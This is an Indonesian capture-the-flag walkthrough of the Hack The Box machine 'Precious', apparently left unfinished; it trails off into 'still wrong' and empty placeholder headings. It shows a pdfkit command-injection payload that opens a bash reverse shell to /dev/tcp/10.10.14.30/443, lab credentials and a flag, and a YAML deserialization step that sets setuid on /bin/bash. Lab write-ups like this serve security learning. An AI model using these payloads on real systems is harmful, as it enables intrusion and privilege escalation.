# Precious 
**SOLVED : JAN 11 | 2023**
![Precious](https://user-images.githubusercontent.com/92077284/211991670-4b07aee9-b558-4b25-9b42-47e17659e981.png)

## Information Gathering
![image](https://user-images.githubusercontent.com/92077284/213347545-adaa6f23-5523-436a-a37d-9aa5c28a627a.png)  
![image](https://user-images.githubusercontent.com/92077284/211992854-535f66c3-a172-4997-9d7d-82a58bb42449.png)  
Pertama - tama lakukan proses **nmap** pada ip yang sudah diberikan pada web htb, hal ini berfungsi untuk memeriksa layanan yang tersedia dalam jaringan  
Didapati ada 2 port, yaitu port **22 dan 80**, serta alamat web yaitu precious.htb  
Disini disimpulkan bahwa **port 22** untuk akses ssh, dan **port 80** adalah penyedia webnya  
Untuk mengakses precious.htb diperlukan command `sudo vim /etc/hosts` untuk menambahkan `10.10.11.189 precious.htb`  
![image](https://user-images.githubusercontent.com/92077284/211993812-b3068588-4e9d-408d-af3d-45356d7fba78.png)  
Masuk ke **10.10.11.189**  
![image](https://user-images.githubusercontent.com/92077284/211994354-6a6245cb-f01b-4bde-8634-d19b03e707eb.png)  
Apabila dicoba isi 'http://google.com' maka akan menunjukan tampilan seperti ini, karena tertulis _Cannot load remote URL!_ maka saya coba untuk _serving http server_  
![image](https://user-images.githubusercontent.com/92077284/211995365-debd1424-dd52-41d1-a55e-4d5855cc7e37.png)
disini akan dilakukan hosting pada port 80 dengan ip yang sesuai dengan ip di **tun0**, agar nantinya dapat ditangkap oleh website  
![image](https://user-images.githubusercontent.com/92077284/211996025-da71de3e-fdf1-44f5-9b52-be06a30c0176.png)  
![image](https://user-images.githubusercontent.com/92077284/213347427-0cbe2aeb-7399-44cc-9ece-ac74a25d8131.png)  
Lalu coba masukan 'http://10.10.14.30:80' ke dalam website  
![image](https://user-images.githubusercontent.com/92077284/211996453-a4bd650a-8551-4b1d-bd86-c485a273c7d7.png)  
Didapati file pdf sebagai berikut, yang bila dibuka akan menampilkan list directory di tempat _serving http server_  
![image](https://user-images.githubusercontent.com/92077284/211996521-9d32d634-253e-4ae5-b2f6-144b1ce999dc.png)  
![image](https://user-images.githubusercontent.com/92077284/213354581-a64b7b8a-5786-406b-b3fa-3ae0ca537556.png)  
Setelah itu analisa file pdf menggunakan **exiftool**, file di analisa menggunakan tool ini karena saya ingin mengetahui meta data dari file atau ada hal yang mencurigakan dari file.   
![image](https://user-images.githubusercontent.com/92077284/211996948-fb392098-7706-4054-8e85-0d6e1068d64f.png)  
Disini saya memanfaatkan **pdfkit v0.8.6** sebagai celah untuk masuk kedalam sistem, pdfkit adalah _PDF document generation library_ untuk browser, yang fungsinya memudahkan browser membuat file, namun pada versi ini terdapat celah kerentanan dimana kita dapat melakukan _Command Injection_ karena URL tidak di sanitasi.  

**CVE-2022–25765** Source: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795  
Dari situ dapat dibuat sebuah _reverse shell_ dengan bantuan **Hack-Tools**  
**Hack-Tools** = https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi  
![image](https://user-images.githubusercontent.com/92077284/213356703-8097f1a2-5a5f-498d-9ece-69cbb88491eb.png)  

```
http://example.com/?name=#{'%20`sleep 5`'}
http://example.com/?name=#{'%20``'}
```
menjadi   
```
http://example.com/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.30/443 <&1'`'}
```
Untuk memulai tahapannya, pertama coba untuk _listen_ pada port 443  
![image](https://user-images.githubusercontent.com/92077284/213357167-d793b9f5-d2eb-4dfc-b7f7-adae4d6ca264.png)  
lalu buat _payload_ dan masukan kedalam website, untuk melakukan _command injection_  
```
http://example.com/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.30/443 <&1'`'}
```
![image](https://user-images.githubusercontent.com/92077284/213357672-62b90aeb-1762-418d-9e22-edc9fa001afb.png)  
lalu aktivitas akan terekam pada terminal yang tadi  
![image](https://user-images.githubusercontent.com/92077284/213358242-9cd66e8b-48e6-4f71-a2b9-86420ffc9b8b.png)  
_Note : IP berbeda karena WU dibuat pada hari berbeda_  

Karena sudah masuk, maka disini akan dilakukan pencarian **flag**  
Yang saya lakukan pertama adalah masuk ke directory awal  
![image](https://user-images.githubusercontent.com/92077284/213358684-a63b2268-5d14-4eef-ad78-9a6dba781803.png)  
lalu disini saya memutuskan untuk masuk ke directory **home** karena biasanya user akan disimpan pada directory ini  
![image](https://user-images.githubusercontent.com/92077284/213358862-5dbc5421-0c27-4afe-b2af-ae987b8e7fea.png)  
Ditemukan 2 user , yaitu **henry** dan **ruby**, disini saya mencoba masuk ke **henry**, namun ada keterbatasan akses
setelah itu saya mencoba untuk masuk ke **ruby**  
![image](https://user-images.githubusercontent.com/92077284/213359072-53bf1b90-981f-44d6-b171-b49d3ba1d2c5.png)  
Disini awalnya saya melihat apa saja yang ada dalam direcotry ini, lalu setelah mencoba-coba, ternyat directory **.bundle** dapat diakses, dan ternyata menampung kredensial dari **henry**

Kredensial henry : `henry:Q3c1AqGHtoI0aXAYFH`  

Setelah itu saya masuk ke akun henry menggunakan *ssh*  
![image](https://user-images.githubusercontent.com/92077284/213359292-7cf62917-2301-4c03-95e2-779249e58a0c.png)  
setelah itu ternyata sudah bisa diakses untuk **user.txt**, dan disini juga sekaligus menjadi **FLAG USER**
![image](https://user-images.githubusercontent.com/92077284/213359417-af9dc795-4d34-4037-a835-8257176cc76c.png)

**FLAG USER** = `a13c7cb8903ad65d586d143f089a7d31`

Step berikutnya saya coba untuk mengakses *root* ternyata belum bisa  
![image](https://user-images.githubusercontent.com/92077284/213359997-fdb4c873-b486-49d0-ba13-a690ca14b368.png)  

Step selanjutnya saya memeriksa *privilage henry*  
![image](https://user-images.githubusercontent.com/92077284/213359780-b77de642-3b9e-4832-9939-adc80791b6bd.png)  
Ternyata ada file yang mengatur akses privilage yaitu pada `/usr/bin/ruby /opt/update_dependencies.rb`  
Disini saya coba untuk membaca file **update_dependencies.rb**  
![image](https://user-images.githubusercontent.com/92077284/213360542-7f2c594e-b5be-4dde-92fe-dbe89aadac11.png)
Setelah dianalisa, ternyata bagian ini dapat dilakukan **YAML Deserialization Attack** karena terdapat bagian pada file yang mengatakan `YAML.load(File.read("dependencies.yml"))`

Source : https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/

Karena tadi yang menjadi permasalahan adalah soal _permission access_, 
![image](https://user-images.githubusercontent.com/92077284/213361192-0d8ba32a-a978-4f30-84ac-36199edbdd59.png)  
maka kita bisa merubah akses henry menjadi lebih tinggi, yaitu dengan menambahkan file dependencies.yml dengan template pada **source** pada bagian **git_Set** menjadi `"chmod u+s /bin/bash"`  
![image](https://user-images.githubusercontent.com/92077284/213362505-18ff1a20-0db7-49ae-80ce-6f9286e13587.png)  
![image](https://user-images.githubusercontent.com/92077284/213362901-2ac4d9a0-902b-415d-8a5e-1f312a733ad9.png)  
![image](https://user-images.githubusercontent.com/92077284/213362528-2e9937aa-77f8-4b07-a752-f343fe7d0f6b.png)  

MASIH SALAH


## a
## a
## a
## a
